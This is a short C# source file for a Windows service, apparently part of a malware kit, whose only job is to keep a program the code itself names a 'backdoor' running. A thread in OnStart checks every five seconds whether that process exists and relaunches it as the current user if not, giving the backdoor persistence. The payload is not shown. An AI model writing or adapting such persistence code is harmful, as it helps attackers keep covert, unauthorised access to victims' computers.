using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using LannConstants;

namespace LBService {
    public partial class Service : ServiceBase {
        public Service() {
            //InitializeComponent();
        }

        protected override void OnStart(string[] args) {
            new Thread(async () => {
                while (true) {
                    const string path = Constants.InstallPath + "/" + Constants.BackdoorFileName;
                    bool doesProcessExist = Process.GetProcessesByName(Constants.BackdoorFileName
                        .Replace(".exe", "")).Length > 0;
                    if(!doesProcessExist) ServiceProcess.StartProcessAsCurrentUser(path);

                    await Task.Delay(5000);
                }
            }).Start();
        }

        protected override void OnStop() { }
    }
}